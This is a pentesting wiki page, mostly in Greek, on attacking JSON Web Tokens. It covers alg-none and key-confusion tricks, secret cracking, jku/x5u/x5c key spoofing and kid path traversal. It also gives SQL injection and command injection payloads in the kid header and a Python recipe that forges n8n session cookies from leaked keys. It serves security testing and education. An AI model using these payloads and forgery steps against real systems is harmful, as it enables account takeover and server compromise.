# JWT Ευπάθειες (Json Web Tokens)

{{#include ../banners/hacktricks-training.md}}

**Μέρος αυτού του άρθρου βασίζεται στην εξαιρετική δημοσίευση:** [**https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)\
**Συγγραφέας του εξαιρετικού εργαλείου για pentest JWTs** [**https://github.com/ticarpi/jwt_tool**](https://github.com/ticarpi/jwt_tool)

### **Γρήγορα αποτελέσματα**

Εκτελέστε [**jwt_tool**](https://github.com/ticarpi/jwt_tool) με λειτουργία `All Tests!` και περιμένετε τις πράσινες γραμμές
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Αν είστε τυχεροί, το εργαλείο θα βρει κάποια περίπτωση όπου η web application ελέγχει λανθασμένα το JWT:

![](<../images/image (935).png>)

Στη συνέχεια, μπορείτε να αναζητήσετε το request στο proxy σας ή να κάνετε dump το χρησιμοποιημένο JWT για αυτό το request χρησιμοποιώντας jwt\_ tool:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
You can also use the [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) to launch JWT attacks from Burp.

### Πρακτική ροή εργασίας αξιολόγησης JWT

- **Scope the session control**: Επιλέξτε ένα user-specific request (π.χ., profile, billing). Αφαιρέστε cookies/headers ένα-ένα μέχρι το request να απορριφθεί για να απομονώσετε ποιο(α) token(s) πραγματικά ελέγχουν την εξουσιοδότηση.
- **Locate JWTs in traffic**: Συχνά βρίσκονται στο `Authorization: Bearer <JWT>`, αλλά εμφανίζονται και σε custom headers ή cookies. Αν το Burp δεν τα επισημαίνει, χρησιμοποιήστε Target → Site map → Engagement tools → Search με regex μοτίβα όπως:
- `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
- `eyJ[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+`
- `[= ]eyJ[A-Za-z0-9_\\/+-]*\.[A-Za-z0-9._\\/+-]*`
- **Decode and enumerate**: Χρησιμοποιήστε Burp **JWT Editor** ή `python3 jwt_tool.py <JWT>` για να διαβάσετε header/payload. Σημειώστε το `alg`, την `exp`/διάρκεια του token, και claims που καθορίζουν authn/authz (`role`, `id`, `username`, `email`, κ.λπ.).
- **Signature enforcement sanity check**: Αλλάξτε ή διαγράψτε μερικά bytes στο τμήμα της υπογραφής και κάντε replay. Η αποδοχή υποδεικνύει απουσία επαλήθευσης υπογραφής και μπορείτε να τροποποιήσετε απευθείας τα payload claims.
- **Goal**: Τροποποιήστε τα payload claims για να αποκτήσετε αυξημένα προνόμια· κάθε επίθεση παρακάτω στοχεύει να κάνει τον server να αποδεχτεί παραποιημένο payload εκμεταλλευόμενη αδύναμο έλεγχο, αδύναμα secrets, ή μη ασφαλή επιλογή κλειδιού.

### Παραποίηση δεδομένων χωρίς να τροποποιήσετε τίποτα

Μπορείτε απλά να παραποιήσετε τα δεδομένα αφήνοντας την υπογραφή ως έχει και να ελέγξετε αν ο server επαληθεύει την υπογραφή. Δοκιμάστε να αλλάξετε το username σας σε "admin", για παράδειγμα.

#### **Ελέγχεται το token;**

Για να ελέγξετε αν γίνεται επαλήθευση της υπογραφής ενός JWT:

- Ένα μήνυμα σφάλματος υποδηλώνει ότι γίνεται επαλήθευση· τυχόν ευαίσθητες λεπτομέρειες σε λεπτομερή μηνύματα σφάλματος πρέπει να εξεταστούν.
- Μια αλλαγή στη σελίδα που επιστρέφεται επίσης δείχνει επαλήθευση.
- Καμία αλλαγή υποδηλώνει ότι δεν υπάρχει επαλήθευση· τότε είναι η στιγμή να πειραματιστείτε με την παραποίηση των payload claims.

### Προέλευση

Είναι σημαντικό να προσδιορίσετε αν το token δημιουργήθηκε server-side ή client-side εξετάζοντας το ιστορικό αιτημάτων του proxy.

- Tokens που εμφανίζονται αρχικά από την πλευρά του client υποδηλώνουν ότι το key μπορεί να είναι εκτεθειμένο στον client-side κώδικα, απαιτώντας περαιτέρω έρευνα.
- Tokens που προέρχονται από server-side υποδεικνύουν μια ασφαλή διαδικασία.

### Διάρκεια

Ελέγξτε αν το token διαρκεί περισσότερο από 24h... ίσως να μην λήγει ποτέ. Αν υπάρχει το "exp" field, ελέγξτε αν ο server το χειρίζεται σωστά.

### Brute-force HMAC secret

[**See this page.**](../generic-hacking/brute-force.md#jwt)

If the header uses **HS256**, dump the token to a file and try offline cracking:
```bash
python3 jwt_tool.py <JWT> -C -d wordlist.txt
hashcat -a 0 -m 16500 jwt.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```
Μόλις ανακτηθεί το secret, φορτώστε το ως συμμετρικό κλειδί στο Burp JWT Editor και επαναυπογράψτε τις τροποποιημένες claims.

### Παράγωγή JWT secrets από leaked config + DB data

Αν ένα arbitrary file read (ή backup leak) αποκαλύπτει τόσο **application encryption material** όσο και **user records**, μερικές φορές μπορείτε να ανακατασκευάσετε το JWT signing secret και να forge session cookies χωρίς να γνωρίζετε κανένα plaintext password. Παράδειγμα μοτίβου που παρατηρείται σε workflow automation stacks:

1. Leak το app key (e.g., `encryptionKey`) από ένα αρχείο config.
2. Leak τον πίνακα χρηστών για να αποκτήσετε `email`, `password_hash` και `user_id`.
3. Συνάγετε το signing secret από το key και στη συνέχεια συνάγετε το per-user hash που αναμένεται στο JWT payload:
```python
jwt_secret = sha256(encryption_key[::2]).hexdigest()              # signing key
jwt_hash = b64encode(sha256(f"{email}:{password_hash}")).decode()[:10]
token = jwt.encode({"id": user_id, "hash": jwt_hash}, jwt_secret, "HS256")
```
4. Τοποθετήστε το υπογεγραμμένο token στο session cookie (π.χ., `n8n-auth`) για να μιμηθείτε τον λογαριασμό χρήστη/διαχειριστή ακόμα και αν το password hash είναι salted.

### Modify the algorithm to None

Set the algorithm used as "None" and remove the signature part.

Use the Burp extension call "JSON Web Token" to try this vulnerability and to change different values inside the JWT (send the request to Repeater and in the "JSON Web Token" tab you can modify the values of the token. You can also select to put the value of the "Alg" field to "None").

### Change the algorithm RS256(asymmetric) to HS256(symmetric) (CVE-2016-5431/CVE-2016-10555)

The algorithm HS256 uses the secret key to sign and verify each message.\
The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.

If you change the algorithm from RS256 to HS256, the back end code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.

Then, using the public key and changing RS256 to HS256 we could create a valid signature. You can retrieve the certificate of the web server executing this:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
Using Burp **JWT Editor**, εισάγετε το δημόσιο κλειδί RSA (από `/.well-known/jwks.json` ή ένα PEM) και εκτελέστε **Attack → HMAC Key Confusion Attack** για να αυτοματοποιήσετε την προσπάθεια επανυπογραφής HS256.

### Νέο δημόσιο κλειδί μέσα στο header

Ένας επιτιθέμενος ενσωματώνει ένα νέο κλειδί στο header του token και ο server χρησιμοποιεί αυτό το νέο κλειδί για να επαληθεύσει την υπογραφή (CVE-2018-0114).

Αυτό μπορεί να γίνει με το Burp extension "JSON Web Tokens".  
(Στείλτε το αίτημα στο Repeater, μέσα στην καρτέλα JSON Web Token επιλέξτε "CVE-2018-0114" και στείλτε το αίτημα).

### JWKS Spoofing

Οι οδηγίες περιγράφουν μια μέθοδο για την αξιολόγηση της ασφάλειας JWT tokens, ειδικά αυτών που χρησιμοποιούν τον header claim "jku". Αυτό το claim πρέπει να δείχνει σε ένα αρχείο JWKS (JSON Web Key Set) που περιέχει το δημόσιο κλειδί απαραίτητο για την επαλήθευση του token.

- **Assessing Tokens with "jku" Header**:
- Επιβεβαιώστε το URL του claim "jku" για να βεβαιωθείτε ότι οδηγεί στο σωστό αρχείο JWKS.
- Τροποποιήστε την τιμή "jku" του token ώστε να δείχνει σε μια ελεγχόμενη web υπηρεσία, επιτρέποντας την παρατήρηση της κίνησης.
- **Monitoring for HTTP Interaction**:
- Η παρατήρηση HTTP αιτήσεων προς το καθορισμένο URL σας υποδεικνύει ότι ο server προσπαθεί να πάρει κλειδιά από τον σύνδεσμο που δώσατε.
- Όταν χρησιμοποιείτε το `jwt_tool` για αυτή τη διαδικασία, είναι κρίσιμο να ενημερώσετε το αρχείο `jwtconf.ini` με τη δική σας θέση JWKS για να διευκολύνετε τις δοκιμές.
- **Command for `jwt_tool`**:

- Εκτελέστε την ακόλουθη εντολή για να προσομοιώσετε το σενάριο με το `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Επισκόπηση θεμάτων του `kid`

Ένα προαιρετικό header claim γνωστό ως `kid` χρησιμοποιείται για τον εντοπισμό ενός συγκεκριμένου κλειδιού, το οποίο γίνεται ιδιαίτερα σημαντικό σε περιβάλλοντα όπου υπάρχουν πολλαπλά κλειδιά για την επαλήθευση της υπογραφής του token. Αυτό το claim βοηθά στην επιλογή του κατάλληλου κλειδιού για την επαλήθευση της υπογραφής.

#### Αποκάλυψη κλειδιού μέσω `kid`

Όταν το claim `kid` υπάρχει στο header, συνίσταται να ψάξετε στον web κατάλογο για το αντίστοιχο αρχείο ή τις παραλλαγές του. Για παράδειγμα, αν δηλώνεται `"kid":"key/12345"`, θα πρέπει να αναζητηθούν στο web root τα αρχεία _/key/12345_ και _/key/12345.pem_.

#### Path Traversal με `kid`

Το claim `kid` μπορεί επίσης να εκμεταλλευτεί για να περιηγηθεί στο file system, πιθανώς επιτρέποντας την επιλογή ενός αυθαίρετου αρχείου. Είναι εφικτό να ελεγχθεί η συνδεσιμότητα ή να εκτελεστούν Server-Side Request Forgery (SSRF) επιθέσεις με την αλλαγή της τιμής `kid` ώστε να στοχεύει συγκεκριμένα αρχεία ή υπηρεσίες. Η παραποίηση του JWT για την αλλαγή της τιμής `kid` ενώ διατηρείται η αρχική υπογραφή μπορεί να επιτευχθεί χρησιμοποιώντας τη σημαία `-T` στο jwt_tool, όπως φαίνεται παρακάτω:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
By targeting files with predictable content, it's possible to forge a valid JWT. For instance, the `/proc/sys/kernel/randomize_va_space` file in Linux systems, known to contain the value **2**, can be used in the `kid` parameter with **2** as the symmetric password for JWT generation.

Ένα πρακτικό μοτίβο για εύθραυστη φόρτωση κλειδιών από το σύστημα αρχείων είναι να δημιουργηθεί ένα HS256 key με JWK `k` ορισμένο σε `AA==`, να οριστεί το `kid` σε ένα traversal όπως `../../../../../../../dev/null`, και να επανα-υπογραφεί—κάποιες υλοποιήσεις θεωρούν το κενό αρχείο ως έγκυρο HMAC secret και θα αποδεχτούν πλαστογραφημένα tokens.

#### SQL Injection via "kid"

Εάν το περιεχόμενο του claim `kid` χρησιμοποιείται για την ανάκτηση ενός κωδικού από βάση δεδομένων, μπορεί να διευκολυνθεί SQL injection με την τροποποίηση του payload του `kid`. Ένα παράδειγμα payload που χρησιμοποιεί SQL injection για να αλλάξει τη διαδικασία υπογραφής του JWT περιλαμβάνει:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Αυτή η τροποποίηση αναγκάζει τη χρήση ενός γνωστού μυστικού κλειδιού, `ATTACKER`, για την υπογραφή του JWT.

#### OS Injection through "kid"

Ένα σενάριο όπου η παράμετρος `kid` καθορίζει ένα μονοπάτι αρχείου που χρησιμοποιείται σε περιβάλλον εκτέλεσης εντολών μπορεί να οδηγήσει σε Remote Code Execution (RCE) ευπάθειες. Ενθέτοντας εντολές στην παράμετρο `kid`, είναι δυνατό να αποκαλυφθούν private keys. Ένα παράδειγμα payload για επίτευξη RCE και αποκάλυψη κλειδιών είναι:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u and jku

#### jku

jku stands for **JWK Set URL**.\
Εάν το token χρησιμοποιεί το claim **`jku`** στο **Header**, τότε ελέγξτε το παρεχόμενο URL. Αυτό θα πρέπει να δείχνει σε ένα URL που περιέχει το αρχείο JWKS που φιλοξενεί το Public Key για την επαλήθευση του token. Τροποποιήστε το token ώστε η τιμή του `jku` να δείχνει σε μια web υπηρεσία για την οποία μπορείτε να παρακολουθείτε την κυκλοφορία.

Πρώτα πρέπει να δημιουργήσετε ένα νέο certificate με νέα private & public keys
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Στη συνέχεια μπορείτε, για παράδειγμα, να χρησιμοποιήσετε [**jwt.io**](https://jwt.io) για να δημιουργήσετε το νέο JWT με τα **δημιουργημένα public και private keys και ρυθμίζοντας την παράμετρο jku ώστε να δείχνει στο certificate που δημιουργήσατε.** Για να δημιουργήσετε ένα έγκυρο jku certificate μπορείτε να κατεβάσετε το αρχικό και να αλλάξετε τις απαραίτητες παραμέτρους.

Μπορείτε να λάβετε τις παραμέτρους "e" και "n" από ένα public certificate χρησιμοποιώντας:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
If the verifier fetches key material remotely, embed a Burp Collaborator URL in `jku`/`x5u` using **JWT Editor → Attack → Embed Collaborator payload**. Any callback confirms SSRF-style key retrieval; then host your own JWKS/PEM at that URL and re-sign with your private key so the service validates attacker-minted tokens.

#### x5u

X.509 URL. Μια URI που δείχνει σε ένα σύνολο δημοσίων πιστοποιητικών X.509 (ένα πρότυπο μορφής πιστοποιητικών) κωδικοποιημένων σε μορφή PEM. Το πρώτο πιστοποιητικό στο σετ πρέπει να είναι αυτό που χρησιμοποιήθηκε για την υπογραφή αυτού του JWT. Τα επόμενα πιστοποιητικά υπογράφουν το προηγούμενο το καθένα, ολοκληρώνοντας έτσι την αλυσίδα πιστοποιητικών. Το X.509 ορίζεται στο RFC 52807. Απαιτείται ασφάλεια μεταφοράς για τη μεταφορά των πιστοποιητικών.

Try to **change this header to an URL under your control** and check if any request is received. In that case you **could tamper the JWT**.

Για να πλαστογραφήσετε ένα νέο token χρησιμοποιώντας ένα πιστοποιητικό υπό τον έλεγχό σας, χρειάζεται να δημιουργήσετε το πιστοποιητικό και να εξαγάγετε τα δημόσια και ιδιωτικά κλειδιά:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Στη συνέχεια μπορείς να χρησιμοποιήσεις, για παράδειγμα, [**jwt.io**](https://jwt.io) για να δημιουργήσεις το νέο JWT με το **δημιουργημένο δημόσιο και ιδιωτικό κλειδί και ορίζοντας την παράμετρο x5u στο πιστοποιητικό .crt που δημιουργήθηκε.**

![](<../images/image (956).png>)

Μπορείς επίσης να εκμεταλλευτείς και τα δύο αυτά vulns **για SSRFs**.

#### x5c

Αυτή η παράμετρος μπορεί να περιέχει το **πιστοποιητικό σε base64**:

![](<../images/image (1119).png>)

Αν ο επιτιθέμενος **δημιουργήσει ένα αυτο-υπογεγραμμένο πιστοποιητικό** και δημιουργήσει ένα πλαστό token χρησιμοποιώντας το αντίστοιχο ιδιωτικό κλειδί, και αντικαταστήσει την τιμή της παραμέτρου "x5c" με το νεοδημιουργημένο πιστοποιητικό και τροποποιήσει τις άλλες παραμέτρους, δηλαδή n, e και x5t, τότε ουσιαστικά το πλαστό token θα γίνει αποδεκτό από τον server.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Ενσωματωμένο Δημόσιο Κλειδί (CVE-2018-0114)

Αν το JWT έχει ενσωματωμένο δημόσιο κλειδί όπως στο παρακάτω σενάριο:

![](<../images/image (624).png>)

Χρησιμοποιώντας το παρακάτω nodejs script είναι δυνατή η δημιουργία ενός δημόσιου κλειδιού από αυτά τα δεδομένα:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="​ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"​;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Είναι δυνατόν να δημιουργηθεί νέο private/public key, να ενσωματωθεί το νέο public key μέσα στο token και να χρησιμοποιηθεί για να δημιουργηθεί μια νέα signature:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Μπορείτε να αποκτήσετε τα "n" και "e" χρησιμοποιώντας αυτό το nodejs script:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finally, using the public and private key and the new "n" and "e" values you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information.

### ES256: Revealing the private key with same nonce

If some applications use ES256 and use the same nonce to generate two jwts, the private key can be restored.

Here is a example: [ECDSA: Revealing the private key, if same nonce used (with SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

Η JTI (JWT ID) claim παρέχει έναν μοναδικό αναγνωριστικό για ένα JWT Token. Μπορεί να χρησιμοποιηθεί για να αποτρέψει το token από το να αναπαραχθεί.\
Ωστόσο, φανταστείτε μια κατάσταση όπου το μέγιστο μήκος του ID είναι 4 (0001-9999). Τα αιτήματα 0001 και 10001 θα χρησιμοποιούν το ίδιο ID. Έτσι, εάν το backend αυξάνει το ID σε κάθε αίτημα, μπορείτε να το εκμεταλλευτείτε για **replay a request** (απαιτώντας την αποστολή 10000 αιτημάτων μεταξύ κάθε επιτυχούς replay).

### JWT Registered claims


{{#ref}}
https://www.iana.org/assignments/jwt/jwt.xhtml#claims
{{#endref}}

### Other attacks

**Cross-service Relay Attacks**

Έχει παρατηρηθεί ότι ορισμένες web εφαρμογές βασίζονται σε μια αξιόπιστη JWT service για τη δημιουργία και διαχείριση των tokens τους. Έχουν καταγραφεί περιπτώσεις όπου ένα token, που δημιουργήθηκε για έναν client από την JWT service, έγινε αποδεκτό από έναν άλλο client της ίδιας JWT service. Εάν παρατηρηθεί η έκδοση ή ανανέωση ενός JWT μέσω τρίτου παρόχου, θα πρέπει να διερευνηθεί η πιθανότητα εγγραφής λογαριασμού σε έναν άλλο client της υπηρεσίας χρησιμοποιώντας το ίδιο username/email. Στη συνέχεια θα πρέπει να επιχειρηθεί να replay το αποκτηθέν token σε ένα αίτημα προς τον στόχο για να ελεγχθεί αν γίνεται αποδεκτό.

- Η αποδοχή του token σας μπορεί να υποδεικνύει ένα κρίσιμο πρόβλημα, ενδεχομένως επιτρέποντας το spoofing οποιουδήποτε λογαριασμού χρήστη. Ωστόσο, πρέπει να σημειωθεί ότι ίσως απαιτείται άδεια για ευρύτερες δοκιμές αν η εγγραφή γίνει σε εφαρμογή τρίτου μέρους, καθώς αυτό μπορεί να εμπίπτει σε νομική γκρίζα ζώνη.

**Expiry Check of Tokens**

Η λήξη του token ελέγχεται χρησιμοποιώντας την "exp" Payload claim. Δεδομένου ότι τα JWTs χρησιμοποιούνται συχνά χωρίς πληροφορίες session, απαιτείται προσεκτικός χειρισμός. Σε πολλές περιπτώσεις, η καταγραφή και το replay του JWT ενός άλλου χρήστη μπορεί να επιτρέψει την impersonation αυτού του χρήστη. Το JWT RFC συνιστά την αντιμετώπιση των JWT replay attacks με τη χρήση της "exp" claim για τον καθορισμό χρόνου λήξης του token. Επιπλέον, η εφαρμογή των σχετικών ελέγχων από την εφαρμογή για να εξασφαλιστεί η επεξεργασία αυτής της τιμής και η απόρριψη των ληγμένων tokens είναι κρίσιμη. Εάν το token περιλαμβάνει την "exp" claim και τα χρονικά όρια των δοκιμών το επιτρέπουν, συνιστάται η αποθήκευση του token και το replay μετά την παρέλευση του χρόνου λήξης. Το περιεχόμενο του token, συμπεριλαμβανομένης της ανάλυσης timestamp και του ελέγχου λήξης (timestamp in UTC), μπορεί να διαβαστεί χρησιμοποιώντας την επιλογή -R του jwt_tool.

- Μπορεί να υπάρχει κίνδυνος ασφαλείας εάν η εφαρμογή εξακολουθεί να επικυρώνει το token, καθώς αυτό μπορεί να υποδεικνύει ότι το token ενδέχεται να μην λήγει ποτέ.

### Tools

- [jwt_tool](https://github.com/ticarpi/jwt_tool) – αποκωδικοποίηση, τροποποίηση claim/header, offline secret cracking (`-C`) και ημι-αυτοματοποιημένες λειτουργίες επίθεσης (`-M at`).
- [Burp JWT Editor](https://github.com/PortSwigger/jwt-editor) – decode/re-sign in Repeater, generate custom keys, and run built-in attacks (**none**, **HMAC key confusion**, **embedded JWK**, **jku/x5u collaborator payloads**).
- [hashcat](https://hashcat.net/hashcat/) `-m 16500` – GPU-επιταχυνόμενος HS256 secret cracking μετά την εξαγωγή των JWTs σε wordlist.


{{#ref}}
https://github.com/ticarpi/jwt_tool
{{#endref}}

## References

- [n8n token forge chain – config+DB leak to JWT signing secret](https://github.com/Chocapikk/CVE-2026-21858)
- [Burp Suite – JWT Editor extension](https://github.com/PortSwigger/jwt-editor)
- [jwt_tool attack methodology](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology)
- [Keys to JWT Assessments – TrustedSec](https://trustedsec.com/blog/keys-to-jwt-assessments-from-a-cheat-sheet-to-a-deep-dive)

{{#include ../banners/hacktricks-training.md}}
